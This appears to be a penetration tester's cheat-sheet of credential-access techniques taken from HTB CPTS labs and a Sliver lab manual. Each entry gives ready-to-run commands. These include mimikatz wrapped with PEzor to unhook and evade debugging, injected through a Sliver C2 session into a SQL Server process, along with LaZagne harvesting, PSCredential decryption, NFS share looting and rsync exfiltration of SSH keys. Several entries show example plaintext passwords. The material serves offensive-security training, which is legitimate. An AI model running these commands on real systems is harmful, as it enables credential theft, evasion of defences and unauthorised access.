# Windows Credential Access & Hunting

### Credential Vault Dump via Mimikatz (LabManual Sliver) [added: 2026-04]
- **Tags:** #Mimikatz #CredentialVault #VaultDump #PEzor #Sliver #Windows #CredentialAccess #DPAPI
- **Trigger:** Compromised Windows host with scheduled tasks or service accounts that may store credentials in Windows Credential Vault
- **Prereq:** Admin/SYSTEM access on target + ability to run mimikatz (directly or via PEzor-wrapped assembly) + Sliver C2 session
- **Yields:** Plaintext or DPAPI-decrypted credentials from Windows Credential Vault (scheduled task creds, service account passwords)
- **Opsec:** High
- **Context:** Scheduled tasks and service accounts store credentials in Windows Credential Vault. Dump with mimikatz `vault::cred /patch`.
- **Payload/Method:**
```bash
# PEzor-wrap mimikatz for vault creds
./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 mimikatz.exe -z 2 -p '"privilege::debug" "token::elevate" "vault::cred /patch" "exit"'
```
```
# Execute via Sliver
[server] sliver (session) > execute-assembly -P <SQLSERVR_PID> -p '...sqlservr.exe' -t 180 /path/mimikatz-vaultcred.exe.packed.dotnet.exe
```

### osTicket DB Backup → Bcrypt Hash Crack (HTB CPTS) [added: 2026-04]
- **Tags:** #osTicket #BcryptCrack #DatabaseBackup #John #HashCracking #WebAppCreds #PHP
- **Trigger:** Found osTicket data backup archive (.zip) on compromised server or accessible share
- **Prereq:** Access to osTicket database backup file (e.g., osticket_data.zip) + john or hashcat for bcrypt cracking + wordlist
- **Yields:** osTicket admin panel credentials, enabling access to /scp/login.php admin interface
- **Opsec:** Low
- **Context:** Found osticket_data.zip on server. config.sql inside contains bcrypt-hashed admin password.
- **Payload/Method:**
```bash
7z x osticket_data.zip
grep -i "INSERT INTO.*ost_staff" config.sql
# Extract bcrypt hash: $2a$08$...
john -w=/usr/share/wordlists/rockyou.txt hash.txt
# → Password: administracion (example)
# Login to OsTicket admin panel at /scp/login.php
```

### LaZagne for Plaintext Credentials (HTB CPTS) [added: 2026-04]
- **Tags:** #LaZagne #CredentialHarvesting #BrowserCreds #Windows #PostExploitation #Pidgin #SavedPasswords
- **Trigger:** Gained shell on Windows host and need to enumerate all stored/cached plaintext credentials across applications
- **Prereq:** Shell access on Windows host + ability to upload and execute LaZagne binary
- **Yields:** Plaintext credentials from browsers, email clients, chat apps (Pidgin), Windows vault, WiFi passwords, and more
- **Opsec:** Med
- **Context:** Run LaZagne on compromised Windows host to enumerate stored passwords across apps.
- **Payload/Method:**
```powershell
# Upload and run
.\lazagne.exe all
# Finds: Pidgin XMPP credentials, browser saved passwords, Windows vault
```

### Windows Credential File Decryption via Import-Clixml (HTB CPTS) [added: 2026-04]
- **Tags:** #ImportClixml #ExportClixml #CredentialFile #DPAPI #PowerShell #Windows #CredentialAccess
- **Trigger:** Found a .cred or .xml file created with Export-Clixml containing encrypted PSCredential object
- **Prereq:** Access to the .cred file + running PowerShell as the same user who created the credential (DPAPI user-bound decryption)
- **Yields:** Plaintext username and password from the encrypted credential file
- **Opsec:** Low
- **Context:** Found `.cred` file created with `Export-Clixml`. Decrypt it with the same user context.
- **Payload/Method:**
```powershell
$credential = Import-Clixml -Path 'C:\Users\Administrator\Documents\svc_ipmi.Cred'
$credential.GetNetworkCredential().username  # svc_ipmi
$credential.GetNetworkCredential().password  # 0okm!QAZ
```

### NFS Share Looting (HTB CPTS) [added: 2026-04]
- **Tags:** #NFS #ShareLooting #TomcatCreds #NetworkFileSystem #Linux #CredentialAccess #MountExfil
- **Trigger:** NFS port (2049) open on target or showmount reveals exported shares
- **Prereq:** Network access to NFS port + mount capabilities on attacker machine (root or sudo)
- **Yields:** Files from NFS share including configuration files with credentials (e.g., tomcat-users.xml, database configs)
- **Opsec:** Low
- **Context:** NFS share exposed to everyone. Mount it locally to enumerate contents including Tomcat credentials.
- **Payload/Method:**
```bash
# List shares
proxychains showmount -e <TARGET_IP>

# Mount the share
mkdir /tmp/nfsmount
mount -t nfs <TARGET_IP>:/ShareName /tmp/nfsmount

# Grep for credentials
grep -r "pass" /tmp/nfsmount | grep "username="
# e.g., tomcat-users.xml: <user username="robot" password="Sup3RAdm1n123@Adm1n" roles="manager-script"/>
```

### rsync File Exfil + SSH Key Theft (HTB CPTS) [added: 2026-04]
- **Tags:** #rsync #SSHKeyTheft #FileExfil #Port873 #Linux #CredentialAccess #RemoteSync
- **Trigger:** rsync port 873 open on target with accessible modules and valid credentials available
- **Prereq:** rsync service on port 873 + valid username/password for rsync module access
- **Yields:** Complete file exfiltration from rsync module (home directories, SSH keys, config files) leading to SSH access
- **Opsec:** Med
- **Context:** rsync port 873 exposed with valid user credentials. Download entire home directory.
- **Payload/Method:**
```bash
# Check exposed modules
nmap -sT -sC -Pn <TARGET> -p 873

# Download recursively
rsync -avr rsync://svc_rsync@<TARGET>/svc_rsync ./rsyncfolder

# Find SSH key
chmod 600 ./rsyncfolder/.ssh/id_rsa
ssh -i ./rsyncfolder/.ssh/id_rsa svc_rsync@<TARGET>
```
